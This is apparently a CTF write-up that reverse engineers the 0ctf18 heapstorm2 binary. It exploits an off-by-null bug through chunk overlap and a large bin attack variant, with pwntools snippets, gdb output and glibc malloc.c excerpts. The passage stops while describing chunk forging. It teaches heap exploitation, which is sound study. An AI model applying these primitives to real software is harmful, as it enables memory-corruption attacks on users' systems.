## Motivation
- I've doing progressively harder heap challenges , and reading malloc.c a lot , especially the large bins logic , and I think documenting this challenge will sum up my familiarity with the subject nicely before moving on to Tcache.


## Abstract 
- in this article, we  examine the `heapstorm2` challenge binary from `0ctf18` , we will go over reverse engineering the binary , pinpointing  the off-by-null vulnerability and transforming it into an arbitrary read/write using a probabilistic approach with  a variant of the large bin attack technique while explaining code snippets from `libc`'s `malloc.c` that are responsible for observed behavior , and eventually get a shell , we will also do a brief probabilistic and statistical analysis of the success rate of this method.

## Content Table
- [[#Motivation]] 
- [[#Abstract]] 
- [[#Content Table]] 
- [[#Disclaimer]] 
- [[#Context]] 
- [[#Analysis]] 
	- [[#strarray]] 
	- [[#allocation]] 
	- [[#update]] 
	- [[#delete]] 
	- [[#view]] 
- [[#The vulnerability]]
- [[#Constraints]]
- [[#Vulnerability analysis]]
	- [[#The null byte primitive]]
		- [[#Zeroing out the in use byte]]
		- [[#Creating a valid prev_size]]
	- [[#The overlap primitive]]
		- [[#Overlap to large bin attack]]
			- [[#Large bin attack variant]]
			- [[#Difference from the standard large bin attack]]
	- [[#Write-heap-address-where primitive]]
		- [[#Automating the large bin attack]]
	- [[#Returning forged chunks from _int_malloc]]
		- [[#The large bin allocation logic]]
		- [[#Forging a valid chunk in 0x1337000-0x1338000 region]]
		- [[#Returning the forged chunk]]
	- [[#Arbitrary read/write primitives]]
		- [[#Chunk addresses obfuscation]]
			- [[#mask_size and mask_buff functions]]
			- [[#Obfuscation in the allocate function]]
			- [[#Deobfuscation in the view/update functions]]
			- [[#Bypassing the obfuscation]]
		- [[#Bypassing the view check]]
		- [[#Getting arbitrary read/write primitives]]
		- [[#Automating the arbitrary write/read primitives]]
	- [[#The leaks]]
		- [[#Heap leak]]
		- [[#Libc leak]]
	- [[#Getting a shell]]
- [[#Exploit]]
- [[#Probablistic and statistical Analysis of the success rate]]
	- [[#Probabilistic analysis]]
	- [[#Statistical analysis]]
- [[#Possible and attempted optimizations]]
	- [[#Optimizing the forged size frequency]]
	- [[#Utilizing the second write from the large bin variant]]
	
		
			
## Disclaimer
-  if you're familiar with this or searching for the proper solution ,there is a better way to do this : using the unsorted bin to get a chunk in the target mmaped area , it is more straightforward and reliable , the approach i take in this article is more probabilistic as it uses the large bin machinery instead and has to satisfy more checks , which forces the use of some minimal brute-forcing.
- the chance of each try being successful is around 2% so it works about once in every 50 tries , the final exploit does the brute-force automatically and spawns a shell in less than 30 seconds.
- the intended solution gets a shell with a (effectively) 100% reliability .
- this solution is only done for learning and documentation reasons  , to see if I could do it and explore some of the less used exploitation paths and variants of the classical large bin attack .
## Context
- the challenge is a stripped 64-bit binary named `heapstorm2` with the following protections :
	- Full Relro
	- Stack canary
	- NX
	- PIE 
	- ASLR enabled
- the binary is supposed to run with libc version 2.24 , and we are provided a `libc-2.24.so` ,we don't get an `ld` but a compatible version can be found, i used `pwninit` to link the binary to libc and ld.
- I had to reverse engineer the binary since we have no source code and it is stripped , i will show relevant snippets of reverse engineered code as we go.
## Analysis
- the program introduces a familiar interface in heap challenges
```
❯ ./heapstorm2_patched 
    __ __ _____________   __   __    ___    ____
   / //_// ____/ ____/ | / /  / /   /   |  / __ )
  / ,<  / __/ / __/ /  |/ /  / /   / /| | / __  |
 / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /
/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/

===== HEAP STORM II =====
1. Allocate
2. Update
3. Delete
4. View
5. Exit
Command:
```

- reverse engineered code of `main` is :
```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  struct buff_info *strarray; // [rsp+8h] [rbp-8h]

  strarray = (struct buff_info *)setup_strarray();
  while ( 1 )
  {
    menu();
    switch ( readlong() )
    {
      case 1LL:
        allocate(strarray);
        break;
      case 2LL:
        update(strarray);
        break;
      case 3LL:
        delete(strarray);
        break;
      case 4LL:
        view(strarray);
        break;
      case 5LL:
        return 0LL;
      default:
        continue;
    }
  }
}
```

### strarray 
- as usual in heap challenge we have an array that holds allocated chunks and the functionalities operate on that , however this case is a bit different as we will see, the setup of the array in `setup_strarray` is :
```c
__int64 setup_strarray()
{
/*...some code before*/
// this sets the maximum size for fastbins to 0 , meaning no fastbin usage
  if ( !mallopt(1, 0) )
    exit(-1);
  if ( mmap((void *)0x13370000, 0x1000uLL, 3, 34, -1, 0LL) != (void *)0x13370000 )
    exit(-1);
  fd = open("/dev/urandom", 0);
  if ( fd < 0 )
    exit(-1);
  if ( read(fd, (void *)0x13370800, 24uLL) != 24 )
    exit(-1);
  close(fd);
  MEMORY[0x13370818] = MEMORY[0x13370810];
  for ( i = 0; i <= 15; ++i )
  {
    *(_QWORD *)(16 * (i + 2LL) + 0x13370800) = mask_buff((struct buff_info *)0x13370800, 0LL);
    *(_QWORD *)(16 * (i + 2LL) + 0x13370808) = mask_size((struct buff_info *)0x13370800, 0LL);
  }
  return 0x13370800LL;
}
```
- first , it makes the maximum size for a fastbin chunk to 0 , which means no fastbin usage in this challenge , as we will see , we'll mostly use the large bin machinery.
- it `mmap`s the memory from 0x1337000 to 0x1338000 , and fills the first 24 bytes from 0x13370800 with random bytes , and then copies  8 bytes from 0x13370800+16 to 13370800+24 , for clarity the memory would look like this :
```
0x13370800    0x13370810    0x13370818    0x13370820
	 |             |             |             |
-----------------------------------------------------
... | bytes A(16) | bytes B (8) | bytes B (8) | ...
-----------------------------------------------------
(notice that bytes B repeat)
```
- after this the code goes on to copy (by `xor`ing)the bytes A into every 16 bytes 16 times consecutively from 0x13370820 to 0x13370820 + 16\*16.

### allocation 
- the code used to perform an allocation is : 
```c
void __fastcall allocate(struct buff_info *strarray)
{
  int i; // [rsp+10h] [rbp-10h]
  int size; // [rsp+14h] [rbp-Ch]
  void *buff; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !mask_size(strarray, strarray[i + 2].size) )
    {
      printf("Size: ");
      size = readlong();
      if ( size > 12 && size <= 4096 )
      {
        buff = calloc(size, 1uLL);
        if ( !buff )
          exit(-1);
        strarray[i + 2].size = mask_size(strarray, size);
        strarray[i + 2].buff = (__int64)mask_buff(strarray, (unsigned __int64)buff);
        printf("Chunk %d Allocated\n", i);
      }
      else
      {
        puts("Invalid Size");
      }
      return;
    }
  }
}
```

- in concise terms , we cannot allocate more than 0x1000 or less than 12 bytes , and we can only have 16 allocated bytes at a time.
- more interestingly , the buffer and their sized are stored in the array `xor`ed with the random 8 bytes values at 0x13370800 and 0x13370808 , so we cannot do the classic control strarray and get write and read anywhere , that is unless we can zero the bytes in those areas , there is another restriction that we'll see in the view function .
### update
- code : 
```c
int __fastcall update(struct buff_info *a1)
{
  unsigned int idx; // [rsp+10h] [rbp-20h]
  int size; // [rsp+14h] [rbp-1Ch]
  char *buff; // [rsp+18h] [rbp-18h]

  printf("Index: ");
  idx = readlong();
  if ( idx >= 0x10 || !mask_size(a1, a1[(int)idx + 2].size) )
    return puts("Invalid Index");
  printf("Size: ");
  size = readlong();
  if ( size <= 0 || size > (unsigned __int64)(mask_size(a1, a1[(int)idx + 2].size) - 12) )
    return puts("Invalid Size");
  printf("Content: ");
  buff = mask_buff(a1, a1[(int)idx + 2].buff);
  readbuff(buff, size);
  strcpy(&buff[size], "HEAPSTORM_II");
  return printf("Chunk %d Updated\n", idx);
}
```
- this allows us to write to the buffers we allocated , but the last 13 written bytes are always "HEAPSTORM_II\0" .
- there is a vulnerability in the appending mechanism , it is discussed in the vulnerability section
- the restrictions on the buffer index are OK. 
### delete
code :
```c
int __fastcall delete(struct buff_info *a1)
{
  char *buff; // rax
  signed int idx; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  idx = readlong();
  if ( (unsigned int)idx >= 0x10 || !mask_size(a1, a1[idx + 2].size) )
    return puts("Invalid Index");
  buff = mask_buff(a1, a1[idx + 2].buff);
  free(buff);
  a1[idx + 2].buff = (__int64)mask_buff(a1, 0LL);
  a1[idx + 2].size = mask_size(a1, 0LL);
  return printf("Chunk %d Deleted\n", idx);
}
```
- this has no inherent problem , no use after free , it frees the buffers , and fills its place with the random bytes just like `setup_strarray` did .

### view
code :
```c
int __fastcall view(struct buff_info *a1)
{
  __int64 size; // rbx
  char *buff; // rax
  unsigned int idx; // [rsp+1Ch] [rbp-14h]

  if ( (a1[1].size ^ a1[1].buff) != 0x13377331 )
    return puts("Permission denied");
  printf("Index: ");
  idx = readlong();
  if ( idx >= 0x10 || !mask_size(a1, a1[(int)idx + 2].size) )
    return puts("Invalid Index");
  printf("Chunk[%d]: ", idx);
  size = mask_size(a1, a1[(int)idx + 2].size);
  buff = mask_buff(a1, a1[(int)idx + 2].buff);
  printbuff(buff, size);
  return puts(nulls);
}
```
- we cannot see any buffer unless we can satisfy `(a1[1].size ^ a1[1].buff) == 0x13377331` , this prevents us from getting leaks in case of an overlap or use after free.

## The vulnerability
- the vulnerability is in update , it is a single null byte overflow , because strcpy keeps the null byte at the end and the null bytes isn't accounted for in the write size :
```c
  if ( size <= 0 || size > (unsigned __int64)(mask_size(a1, a1[(int)idx + 2].size) - 12) )
```
- it should be 13 instead to account for the null byte
- this allows us to create overlap , althrough not as easily as if we had complete control of what's written.
## Constraints
- we can only have 16 allocated chunks 
- the sizes are comprised between 12 and 0x1000(4096)
- no fastbin usage
- the heap addresses are stored obfuscated in the array
- we cannot view the contents of chunks before gaining control of 16 bytes at 0x13370810 and overwriting them to pass the `view` check.


## Vulnerability analysis
- in this section  , i will be talking about malloc's chunks and bins ,i assume the reader has knowledge of them , i not refer to  : https://sourceware.org/glibc/wiki/MallocInternals 
- to be more effective at interacting with the program , i implemented a python script using `pwntools` to interact with the binary through python functions instead of manually , i will be using those for examples, the implementation is in the exploit section.
### The null byte primitive
- at the beginning the only primitive we have as that we can 
	- write a null byte past our buffer 
	- zero out any byte at offset 12 of our buffer or higher till the overflow byte 
- we will use this to :
	- clear the in use bit of the `size` field of the next buffer , the next buffer's size should be 16 bytes aligned , this way the last byte of the size is zero and by clearing out the in use bit we don't affect the size.
	- fabricate a `prev_size` field that is 16 bytes aligned and allocate other buffers in such a way that `current chunk` - `prev size` lands on a valid chunk.

#### Zeroing out the in use byte 
- we can allocate two chunks then write the full size of the first allocated chunk to it , the chunk will overflow and the lowest byte of the the next chunk's size will be zeroed out. 
- demo code :
```python
 one = allocate(r,0x30-8)
 allocate(r,0x30-8)
 r.interactive()
 update(r,one,0x30-20,(0x30-20)*b'A')
 r.interactive()
```
- before the write :
```gdb
0x73dba4dd30	0x0000000000000000	0x0000000000000031
0x73dba4dd40	0x0000000000000000	0x0000000000000000
0x73dba4dd50	0x0000000000000000	0x0000000000000000
0x73dba4dd60	0x0000000000000000	0x0000000000000031< see this
0x73dba4dd70	0x0000000000000000	0x0000000000000000
0x73dba4dd80	0x0000000000000000	0x0000000000000000
0x73dba4dd90	0x0000000000000000	0x0000000000021271
```
- after the write :
```gdb
0x73dba4dd30:	0x0000000000000000	0x0000000000000031
0x73dba4dd40:	0x4141414141414141	0x4141414141414141
0x73dba4dd50:	0x4141414141414141	0x5041454841414141
0x73dba4dd60:	0x49495f4d524f5453	0x0000000000000000<< wiped
0x73dba4dd70:	0x0000000000000000	0x0000000000000000
0x73dba4dd80:	0x0000000000000000	0x0000000000000000
```

#### Creating a valid prev_size
- as you can see in the previous demonstration , the prev_size field just before the wiped size is 0x49495f4d524f5453 , if this is used for any operation such as `unlink` the program will crash , we need to fabricate one such as buffer - prev_size lands on a valid chunk , to do this we will use our second part of the primitive .
- first let's zero out the entire prev size with a loop and keep only two bytes at the lowest and second to lowest byte positions.
- demo code : 
```python 
for i in range(7):
		resp = update(r,one,0x30-8-12-i, (0x30-8-12-i)*p8(0))
r.interactive()
```
- after the iterations :
```gdb
pwndbg> x/10gx 0xfd52b2fd380
0xfd52b2fd380:	0x0000000000000000	0x0000000000000031
0xfd52b2fd390:	0x0000000000000000	0x0000000000000000
0xfd52b2fd3a0:	0x4548000000000000	0x5f4d524f54535041
0xfd52b2fd3b0:	0x0000000000004949	0x0000000000000000<<size
					[prev size above]
```

- prev size is now 0x4949 , we cannot use this because we need chunk - prev_size to land on a valid chunk ,and chunk don't happen naturally at misaligned positions, so we will skip zeroing the second to lowest byte and zero the lowest by doing :
```python
 for i in range(9):
	  if i != 7:
		  resp = update(r,one,0x30-8-12-i, (0x30-8-12-i)*p8(0))
r.interactive()
```
- this results in :
```gdb 
pwndbg> x/10gx 0xe38f8599b00
0xe38f8599b00:	0x0000000000000000	0x0000000000000031
0xe38f8599b10:	0x0000000000000000	0x0000000000000000
0xe38f8599b20:	0x5041454800000000	0x49495f4d524f5453
0xe38f8599b30:	0x0000000000004900	0x0000000000000000
					[prev size above]
```
- prev size now is 0x4900 , and so it is aligned , we can set up some chunks before this one such that chunk-0x4900 coincides with a valid chunk.

- we will  now use this fact to :
	- allocate chunks before our own , such that chunk-prev_size coincides with a previous chunk.
	- allocate a chunk ahead of ours , so when we free our chunk , it does not get consolidated with the top chunk , this happens if our chunk is next to the top of the heap, by allocating a "guard" chunk ahead , we prevent that
	- call free on the previous chunk
	- call free on our chunk , which will call unlink on the previous chunk , make its size 0x4900+our chunk's size and place it in the unsorted bin, the malloc.c code responsible for this is :
		```c
		_int_free (mstate av, mchunkptr p, int have_lock){
		/*...some code*/
/*
	Consolidate other non-mmapped chunks as they arrive.
*/

			else if (!chunk_is_mmapped(p)) {
				/*...some code*/

				 /* consolidate backward */
			  if (!prev_inuse(p)) {
		       prevsize = p->prev_size;
		       size += prevsize;
		       p = chunk_at_offset(p, -((long) prevsize));
		       unlink(av, p, bck, fwd);
		     }
		
		     if (nextchunk != av->top) {
		       /* get and clear inuse bit */
		       nextinuse =
		        inuse_bit_at_offset(nextchunk, nextsize);
		
		       /* consolidate forward */
		       if (!nextinuse) {
		     unlink(av, nextchunk, bck, fwd);
		     size += nextsize;
		       } else
		     clear_inuse_bit_at_offset(nextchunk, 0);
	
		/*...some code*/
	   /*
     Place the chunk in unsorted chunk list. Chunks are
     not placed into regular bins until after they have
     been given one chance to be used in malloc.
       */

       bck = unsorted_chunks(av);
       fwd = bck->fd;
       if (__glibc_unlikely (fwd->bk != bck))

       errstr = "free(): corrupted unsorted chunks";
       goto errout;
     }
       p->fd = fwd;
       p->bk = bck;
       if (!in_smallbin_range(size))
     {
       p->fd_nextsize = NULL;
       p->bk_nextsize = NULL;
     }
       bck->fd = p;
       fwd->bk = p;

       set_head(p, size | PREV_INUSE);
       set_foot(p, size);

       check_free_chunk(av, p);
     }	
		```
	- note : the line `size += prevsize;` adds 0x4900 to the unlinked chunk (at our chunk with forged prev_size - 0x4900) , this makes it large enough to span several chunk up to the chunk with the forged prev_size.
### The overlap primitive 
- the previous null byte primitive allowed us to put a chunk with a forged very large size into the unsorted bin , we can leverage this to get overlap by using the fact that `_int_malloc` on an allocation request will now do :
	- split a chunk of the size we want from the beginning of the unsorted chunk , this is only done if our request is larger than every chunk in the large bins , because mallow used a best fit selection , if there is a chunk in the bins that is smaller than the one we put in the unsorted list and larger than the size of our request , it will split from that.
	- advance the header of the unsorted chunk forward and reduce its its size
	- return the split out chunk
	- the code responsible is :
```c
static void *
_int_malloc (mstate av, size_t bytes)
{
	/*some code*/
	
else {
	size = chunksize (victim);

	/*  We know the first chunk in this bin is big enough to use. */
    assert ((unsigned long) (size) >= (unsigned long) (nb));

	remainder_size = size - nb;
	
	/* unlink */
	unlink (av, victim, bck, fwd);
	
	/* Exhaust */
	if (remainder_size < MINSIZE)
	  {
	    set_inuse_bit_at_offset (victim, size);
	    if (av != &main_arena)
	      victim->size |= NON_MAIN_ARENA;
	  }
	
	/* Split */
		else {
			remainder = chunk_at_offset (victim, nb);

		    /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here.  */
	        bck = unsorted_chunks (av);
			 fwd = bck->fd;
          if (__glibc_unlikely (fwd->bk != bck))
             {
               errstr = 
               "malloc(): corrupted unsorted chunks 2";
               goto errout;
             }
           remainder->bk = bck;
           remainder->fd = fwd;
           bck->fd = remainder;
           fwd->bk = remainder;

           /* advertise as last remainder */
           if (in_smallbin_range (nb))
             av->last_remainder = remainder;
           if (!in_smallbin_range (remainder_size))
             {
               remainder->fd_nextsize = NULL;
               remainder->bk_nextsize = NULL;
             }
           set_head (victim, nb | PREV_INUSE |
             (av != &main_arena ? NON_MAIN_ARENA : 0));
           set_head (remainder, remainder_size | PREV_INUSE);
                   set_foot (remainder, remainder_size);
            }
       check_malloced_chunk (av, victim, nb);
       void *p = chunk2mem (victim);
			 alloc_perturb (p, bytes);
			 return p;
			 }
		} 
```
- 
	- notice how it also advertises the code as "the last remainder" , a consequence of this is that next time we make a request that is small bin sized it will also be split from our unsorted bin chunk.
	
- to better illustrate how this will allow us , i present you to think that the allocator now maintains to separate views of the memory layout :
	- first view is the 'correct' one in which we just allocated some chunk and freed two of them :
```
-----------------------------------------------------------
freed chunk|other chunks|forged prevsize chunk|guard|topchunk 
-----------------------------------------------------------
```
- 
	- second view where the size of the freed chunk is 0x4900 + size of our forged prev_size chunk , this makes the malloc threat the whole memory from the freed chunk to the guard as free :
```
-----------------------------------------------------------
freed chunk                                |guard|top chunk 
-----------------------------------------------------------
```
- 
	- the second view along with the fact that we can allocate chunk that are cut from the free chunk , allows us to allocate chunks that overlap with the chunks that are between the freed chunk and the guard , we now have two handles for the same memory space , and thus overlap.
#### Overlap to large bin attack

##### Large bin attack variant
- having overlapping chunks , or multiple handles to the same heap memory allows us to perform a large bin attack(or a variant of it as we will see) or an unsorted bin attack , both allows us to write an arbitrary heap pointer to any writable location that we know the address of, however  because the large bins uses extra links for its "skip-list" ,namely the `bk_nextsize` and `fd_nextsize` a large bin attack allows us to write the same address to two locations at once instead of one  , we will not be using the second write in this article but it is worth noting .

- the code that allows us to perform this attack is the following large bin insertion logic :
```c
static void *
_int_malloc (mstate av, size_t bytes)
{
	/*some code*/
	
 while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av)) {
	bck = victim->bk;
	
	/*some code*/
	
	 /* place chunk in bin */
	
	if (in_smallbin_range (size))
	  {
		/*some code */
	  }
	else {
		victim_index = largebin_index (size);
		bck = bin_at (av, victim_index);
		fwd = bck->fd;
		
		/*some code */
	else {	
		assert ((fwd->size & NON_MAIN_ARENA) == 0);
		while ((unsigned long) size < fwd->size)
		{
		  fwd = fwd->fd_nextsize;
		assert ((fwd->size & NON_MAIN_ARENA) == 0);
		}
		if ((unsigned long) size == (unsigned long) fwd->size)
		/* Always insert in the second position.  */
			fwd = fwd->fd;
		else {
			victim->fd_nextsize = fwd;
			victim->bk_nextsize = fwd->bk_nextsize;
			fwd->bk_nextsize = victim;
			victim->bk_nextsize->fd_nextsize = victim;
			}
		}
  }
	bck = fwd->bk;
	}
	
/*some code*/

	mark_bin (av, victim_index);
	victim->bk = bck;
	victim->fd = fwd;
	fwd->bk = victim;
	bck->fd = victim;
	
/*some code*/
}
```
- assuming we can use an overlap to control the metadata of a chunk that is in the head position of a large bin , say the bin that holds sizes from 0x400 to 0x430 , then we control the following fields from the code above :
	- fwd -> fd
	- fwd -> bk
	- fwd -> fd_nextsize
	- fwd -> bk_nextsize
- to perform this attack we will leverage the fact that the largebins are sorted from  largest to smallest in size (to facilitate best fit fetching) , if we free a chunk within the bin range but larger than the head we control the meta data of, it will be inserted as the new head , that will trigger the execution code above.
- this freed chunk is what's called `victim` in the code above .
- our control over the fields and ability to trigger the execution of this code allows us to leverage these lines :
  ```c
	
			victim->bk_nextsize = fwd->bk_nextsize;
			victim->bk_nextsize->fd_nextsize = victim;
			/*...*/
		bck = fwd->bk;
		/*...*/
	bck->fd = victim;
  ```
- note : the difference here from a large bin attack is that instead of inserting a chunk after the head , we trigger its insertion as the new head , however , that never happens ( be reminded that `fwd` here is the head ) ,notice that we control the values of fwd->bk and fwd->bk_nextsize , the program does :
	- perform first write by  setting victim->bk_nextsize to fwd->bk_nextsize which is controlled by us , then writing victim to victim->bk_nextsize->fd_nextsize , dereferencing the values we provided and writing victim to offset 0x20 past it .
	- next is when we intercept the insertion as head to perform our second write , in the third line bck is set to fwd->bk , which in normal circumstances , if fwd is the head of the bin , bck would become the address of the bin (be reminded that bin headers are a part of the bins and act as elements in the linked lists so the bk field of the head refers to the bin header and the fd field of the last chunk also does ,similarly, the fd field of the bin header refers to the head and the bk field of refers to the tail , which is the smallest in case of large bins  ), this means that instead of bck being the bin header it is now a values controlled by us , thus the last line setting bck->fd to victim does our second write instead of setting victim as the head of the bin.

- to write the value victim to any address we know by putting it in fwd->bk or fwd->bk_nextsize using our overlap primitive.
- here is a demonstration :
	```python
	'''overlap code ...'''
	loc = 0x13370010 # target for write
	loc2 = 0x13370020 # second target for write
	 #setting up the head of the bin
	head = allocate(r,0x400-8)
	allocate(r,0x500-8)#guard to prevent consolidation
	delete(r,head)
	#allocating a chunk larger than head moves it to largebins
	flush = allocate(r,0x1000)
	delete(r,flush)#clean up , we don't need it
	written=allocate(r,0x400)
	guard = allocate(r,0x400)#guard , avoid consolidation
	#forged links
	# fwd->bk is +0x10
	# fwd->bk_nextsize is + 0x20
	# thus i substract to match the offsets
	chunk = 2*p64(loc-0x10) + 2*p64(loc2-0x20)
	#using overlap to forged links
	resp = update(r,2,len(chunk),chunk)
	#put in unsorted
	delete(r,written)
	#insertion caused by this flush does our write
	flush = allocate(r,0x1000)
	delete(r,flush)
	r.interactive()
	```
- result :
	```gdb
	pwndbg> x/10gx 0x13370000
0x13370000:	0x0000000000000000	0x0000000000000000
0x13370010:	0x0000064b92daa900	0x0000000000000000
0x13370020:	0x0000064b92daa900	0x0000000000000000
0x13370030:	0x0000000000000000	0x0000000000000000
0x13370040:	0x0000000000000000	0x0000000000000000
	```
- we successfully wrote a heap address to the target location.

##### Difference from the standard large bin attack
- a normal large bin attack inserts an new chunk that is *smaller* than the head , contrary to the variant described above , and then leverages the same insertion mechanism , both approaches keep the head in its place , the standard by making the chunk smaller and thus not inserted as head , and the one above by intercepting the process of setting victim as head to do an arbitrary address write.
### Write-heap-address-where primitive
#### Automating the large bin attack
- the goal in this section is to automate the previous primitive to allow us to make a write-heap-address-to-a-location primitive that is sustainable and can be used as much times as necessary while maintaining a clean and predictable heap layout .
- to do so I present you with the logical steps i used in the manual construction of the primitive :
	1. allocate the head of the bin , that is also of the smallest size within the bin range
	2. allocate a guard to prevent the head from consolidating with nearby chunks , this is assuming the chunk before the head is not free , which it isn't in our case.
	3. allocate a chunk within the bin range that is larger than the head 
	4. allocate a guard to prevent the new chunk from consolidating
	5. edit the links of the newly allocated chunk to target addresses with adjustment to the offsets of them member of chunk structures , remember that the write happens to fwd->bk + 0x10 (->fd) and to fwd->bk_nextsize + 0x20(->fd_nextsize) .
	6. free the newly allocated chunk , and allocate a large chunk then free it to trigger insertion into a bin , then let the large bin insertion mechanism perform our write , as described in the previous section.
	- note : keep in mind that the size we request in all this attack should be larger than all chunks in the unsorted bin except the large one we made in the overlap section , to make sure that our chunks are overlapping others.
- we can enhance the previous chain further to make automated , repeatable and predictable by :
	- after the write is done , we can free the guard that we allocated to prevent the new chunk from consolidation this has two effects :
		1. the guard , through the logic below is merged with the new chunk that's been freed , calling `unlink` on the new chunk and consequently both consolidating the guard and the new chunk  and  removing it from the large bin
		```c
	_int_free (mstate av, mchunkptr p, int have_lock){
		
		/*...some code*/
		
		    /* consolidate backward */
			if (!prev_inuse(p)) {
			  prevsize = p->prev_size;
			  size += prevsize;
			  p = chunk_at_offset(p, -((long) prevsize));
			  unlink(av, p, bck, fwd);
			}
		
		/*...some code*/

		}
		```
		2. after this is done , through the logic below ,a second `unlink` is called the next chunk which the chunk with a forged size that we made in the overlap section ,and which is in the unsorted bin 
		```c
	_int_free (mstate av, mchunkptr p, int have_lock){
		
		/*...some code*/

	    /* consolidate forward */
		  if (!nextinuse) {
			unlink(av, nextchunk, bck, fwd);
			size += nextsize;
			} 
		
		/*...some code*/

		}
		```
		- to illustrate ,here is the memory layout after the large bin attack (f) mean the chunk is free:
		```
	 	---------------------------------------------------
 		head(f)|guard|newchunk(f)|guard|forged size chunk(f) 
		---------------------------------------------------
		```
		- and this is the layout after the first (backwards consolidation) have been made as a consequence of freeing the last guard.
		```
		----------------------------------------------------
		head(f)|guard|merged(f)|forged size chunk(f) 
		----------------------------------------------------
		```
		- and this is the layout after the second (forward consolidation) have been made .
		```
		---------------------------------------------------
		head(f)|guard|forged size chunk(f) (still in unsorted)
		---------------------------------------------------
		```
		- as can be observed the guard and new chunk have been merged into the forged size chunk , decreasing its size and making it as if we just set up the head and its guard , effectively erasing the history of most of the large bin attack except the head setup part .
	
	- this is useful because we can :
		- reallocate the new chunk (it will be the same address because chunks are cut from the beginning ) .
		- reallocate the guard 
	- this is possible because the head chunk always stays at the head position , thanks to the guard chunk ahead of it that's never freed , this allows us to cycle writes by only allocating and freeing a new chunk and guard repeatedly.
	- a demonstration code is as follows:
```python
    #setting up the head of the bin
    head = allocate(r,0x400-8)
    allocate(r,0x500-8)#guard to prevent consolidation
    delete(r,head)
    flush = allocate(r,0x1000)
    delete(r,flush)

    def write_heapaddr_at(r,loc):
        newchunk=allocate(r,0x400)
        guard = allocate(r,0x400)#guard , avoid consolidation
        links = 2*p64(loc-0x10) + 2*p64(0x13370000-0x20)
        resp = update(r,2,len(links),links)
				
        flush = allocate(r,0x1000)
        delete(r,flush)
				
        delete(r,guard)
				
				
write_heapaddr_at(r,0x13370400)#serves as fd
write_heapaddr_at(r,0x13370410)#fd, same val as fd
```
- note , in the second half of the links i used 0x13370000-0x20 to be `bk_nextsize` and `fd_nextsize` , the second write as was explained happens to bk_nextsize+0x20 which puts it at 0x13370000 , we write it there to a mmaped location that we know to avoid a segmentation fault , otherwise it is unused,
- note : i intentionally only utilized one of the write mechanism of the two to keep it simple , since we can do unlimited writes now , it doesn't make any difference .
	- result  :
```gdb
pwndbg> x/10gx 0x13370400
0x13370400:	0x00000421b1c973a0	0x0000000000000000
0x13370410:	0x00000421b1c973a0	0x0000000000000000
0x13370420:	0x0000000000000000	0x0000000000000000
0x13370430:	0x0000000000000000	0x0000000000000000
0x13370440:	0x0000000000000000	0x0000000000000000
```

### Returning forged chunks from \_int_malloc
- thus far we have an automated and repeatable primitive that lets up write the same heap address to any writable address we know off , in this section we will try to use this to get malloc to return arbitrary chunks of our choice , which will enable us to ;
	- write up to 0x1000 bytes to any writable address we know of , a write-what-where primitive.
	- read any memory by utilizing our write-what where primitive to satisfy the check imposed by the challenge's `view` function.
- this is the part where the method described in this article diverges from the intended solution for this challenge , as the intended solution uses the unsorted bin to achieve this with less restrictions and thus reliably , meanwhile this approach uses the large  bins logic which requires us to satisfy more invariants in the chunks we forge , which in turn makes this approach less reliable but nonetheless a practical alternative as we will see.

##### The large bin allocation logic
- the bin is a circular doubly linked list that is organized from largest to smallest  , with the head being the largest chunk in the bin , and traversing by `chunk->bk_nextsize` goes towards larger and larger sizes until , except the bk_nextsize of the head that points to the smallest (circular) , and vice-versa with `chunk->fd_nextsize`.
- when `_int_malloc` is given a large request does the following :
	- match the size to a bin whose range includes the requested size .
	- search that bin for the best-fit match , this means the smallest chunk that satisfies the request.
	- if not found it scans the other large bins 
	- if not it returns a chunk from the top of the heap.
- we are interested in the second step , which is the search for the best-fit in the bin that corresponds to the request size . it does so by following the skip-list , which traverses chunks by sizes and skips chunks that have the same size , this is done by the `bk_nextsize` and `fd_nextsize` links , which are exclusively used for large bin chunks , `_int_malloc` checks the head and :
	1. if it is large enough satisfy the request , it skips the head searches the bin for the best fit by looping from the smallest to largest chunk and getting the first fit (thus the best fit) , this is because the head is the largest chunk in the bin, and there might be smaller chunks that verify the request in the bin , here's the code that responsible for this:
	```c
       /*
          If a large request, scan through the 
          chunks of current bin in
          sorted order to find smallest that fits.
            Use the skip list for this.
        */

    if (!in_smallbin_range (nb))
		{
		bin = bin_at (av, idx);

      /* skip scan if empty or largest chunk is too small */
      if ((victim = first (bin)) != bin &&
      (unsigned long) (victim->size) >= (unsigned long) (nb))
        {
		/*this skips the head and goes to the smalles*/
          victim = victim->bk_nextsize;
          while (((unsigned long) (size = chunksize (victim))
           <
          (unsigned long) (nb)))
              victim = victim->bk_nextsize;

	/*some code...*/
	}
	/*some code...*/
	}
	```
	2.  if the head is not large enough it skips the bin , since the head is the largest no other chunks in the bin will satisfy the request if the head doesn't.
- in our case , we are interested in the first course of  action , since we can put a head large enough as the head , we also control which chunk the search loop starts from , because it is derived from firstchunk->bk_nextsize , and we have control over that , so if we can put a chunk in there that verifies the request , it will be chosen.
##### Forging a valid chunk in 0x1337000-0x1338000 region
- the goal here is to return a chunk in the 0x1337000-0x1338000 region that will allow us to control `strarray` which will enable us to do arbitrary controled writes anywhere we want , a write-what-where primitive, and it'll also allow us to satisfy the `view` function condition (see the `view` section) and get an arbitrary read primitive and by consequence solving the challenge.
- when a chunk is chosen by the large bin allocation mechanism ,  `unlink` is called on that chunk to remove it from both the normal and skip lists of the bin , below is the logic :
```c
if (!in_smallbin_range (nb))
  {
	/*some code...*/
        while (((unsigned long) (size = chunksize (victim)) 
        <
        (unsigned long) (nb)))
          victim = victim->bk_nextsize;
	/*some code...*/

        remainder_size = size - nb;
        unlink (av, victim, bck, fwd);

	/*some code...*/
	
        check_malloced_chunk (av, victim, nb);
        void *p = chunk2mem (victim);
        alloc_perturb (p, bytes);
        return p;
```
- to be able to leverage the mechanism in the previous section , we need to forge a chunk that satisfies a list of conditions and malloc invariants enforced by `unlink` :
	- the chunk size should be :
		- adequate to satisfy the request 
		- not so large that chunk address + size lands in unmaped memory or else it'll segfault.
		- satisfies `unlink` checks 
